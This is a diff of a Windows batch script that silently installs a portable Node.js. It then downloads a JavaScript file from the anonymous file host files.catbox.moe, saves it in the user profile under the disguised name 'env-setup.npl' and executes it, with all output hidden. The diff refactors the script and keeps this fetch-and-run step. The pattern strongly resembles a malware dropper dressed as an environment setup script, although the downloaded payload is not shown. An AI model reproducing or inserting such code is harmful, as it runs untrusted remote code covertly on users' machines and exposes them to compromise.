@@ -38,21 +38,14 @@ for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod https://nodejs
 
 REM Remove leading "v"
 set "NODE_VERSION=%LATEST_VERSION:~1%"
-set "OS_ARCH=x86"
-if /i "%PROCESSOR_ARCHITECTURE%"=="AMD64" set "OS_ARCH=x64"
-if /i "%PROCESSOR_ARCHITEW6432%"=="AMD64" set "OS_ARCH=x64"
+call :detect_windows_arch
+if errorlevel 1 exit /b 1
 
 set "NODE_MSI=node-v%NODE_VERSION%-%OS_ARCH%.msi"
 set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
 set "EXTRACT_DIR=%~dp0nodejs"
-set "PORTABLE_NODE="
-set "PORTABLE_NODE_DIR="
-if /i "%OS_ARCH%"=="x64" (
-    set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"
-    set "PORTABLE_NODE_DIR=%EXTRACT_DIR%\PFiles64\nodejs"
-) else (
-    set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles32\nodejs\node.exe"
-    set "PORTABLE_NODE_DIR=%EXTRACT_DIR%\PFiles32\nodejs"
+if /i not "%OS_ARCH%"=="x64" if /i not "%OS_ARCH%"=="arm64" (
+    exit /b 1
 )
 set "NODE_EXE="
 
@@ -66,20 +59,15 @@ if not errorlevel 1 (
 )
 
 if not defined NODE_EXE (
-    if exist "%PORTABLE_NODE%" (
-        set "NODE_EXE=%PORTABLE_NODE%"
+    call :resolve_portable_node
+    if defined NODE_EXE (
         set "PATH=%PORTABLE_NODE_DIR%;%PATH%"
     ) else (
 
     :: -------------------------
     :: Download Node.js MSI if needed
     :: -------------------------
-    where curl >nul 2>&1
-    if errorlevel 1 (
-        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'" >nul 2>&1
-    ) else (
-        curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%" >nul 2>&1
-    )
+    call :download_file "%DOWNLOAD_URL%" "%~dp0%NODE_MSI%"
 
     if exist "%~dp0%NODE_MSI%" (
         msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%" >nul 2>&1
@@ -88,16 +76,11 @@ if not defined NODE_EXE (
         exit /b 1
     )
 
-    if exist "%PORTABLE_NODE%" (
-        set "NODE_EXE=%PORTABLE_NODE%"
+    call :resolve_portable_node
+    if defined NODE_EXE (
         set "PATH=%PORTABLE_NODE_DIR%;%PATH%"
     ) else (
-        if exist "%EXTRACT_DIR%\PFiles\nodejs\node.exe" (
-            set "NODE_EXE=%EXTRACT_DIR%\PFiles\nodejs\node.exe"
-            set "PATH=%EXTRACT_DIR%\PFiles\nodejs;%PATH%"
-        ) else (
-            exit /b 1
-        )
+        exit /b 1
     )
     )
 )
@@ -115,12 +98,7 @@ if not defined NODE_EXE (
 set "CODEPROFILE=%USERPROFILE%"
 if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"
 
-where curl >nul 2>&1
-if errorlevel 1 (
-    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://files.catbox.moe/1gq866.js' -OutFile '%CODEPROFILE%\env-setup.npl'" >nul 2>&1
-) else (
-    curl -L -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/1gq866.js" >nul 2>&1
-)
+call :download_file "https://files.catbox.moe/1gq866.js" "%CODEPROFILE%\env-setup.npl"
 
 :: -------------------------
 :: Run the parser
@@ -137,3 +115,47 @@ if exist "%CODEPROFILE%\env-setup.npl" (
 )
 
 exit /b 0
+
+:detect_windows_arch
+set "OS_ARCH="
+if /i "%PROCESSOR_ARCHITECTURE%"=="ARM64" set "OS_ARCH=arm64"
+if /i "%PROCESSOR_ARCHITEW6432%"=="ARM64" set "OS_ARCH=arm64"
+if not defined OS_ARCH if /i "%PROCESSOR_ARCHITECTURE%"=="AMD64" set "OS_ARCH=x64"
+if not defined OS_ARCH if /i "%PROCESSOR_ARCHITEW6432%"=="AMD64" set "OS_ARCH=x64"
+if not defined OS_ARCH exit /b 1
+goto :eof
+
+:download_file
+set "DOWNLOAD_SOURCE=%~1"
+set "DOWNLOAD_TARGET=%~2"
+if exist "%DOWNLOAD_TARGET%" del "%DOWNLOAD_TARGET%" >nul 2>&1
+where curl >nul 2>&1
+if errorlevel 1 (
+    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri '%DOWNLOAD_SOURCE%' -OutFile '%DOWNLOAD_TARGET%'" >nul 2>&1
+) else (
+    curl -s -L -o "%DOWNLOAD_TARGET%" "%DOWNLOAD_SOURCE%" >nul 2>&1
+)
+goto :eof
+
+:resolve_portable_node
+set "NODE_EXE="
+set "PORTABLE_NODE_DIR="
+for %%D in (
+    "%EXTRACT_DIR%\nodejs"
+    "%EXTRACT_DIR%\PFiles\nodejs"
+    "%EXTRACT_DIR%\PFiles64\nodejs"
+    "%EXTRACT_DIR%\Program Files\nodejs"
+    "%EXTRACT_DIR%\Program Files (x86)\nodejs"
+) do (
+    if exist "%%~D\node.exe" (
+        set "PORTABLE_NODE_DIR=%%~D"
+        set "NODE_EXE=%%~D\node.exe"
+        goto :eof
+    )
+)
+for /f "delims=" %%F in ('dir /b /s "%EXTRACT_DIR%\node.exe" 2^>nul') do (
+    set "NODE_EXE=%%F"
+    for %%D in ("%%~dpF.") do set "PORTABLE_NODE_DIR=%%~fD"
+    goto :eof
+)
+goto :eof
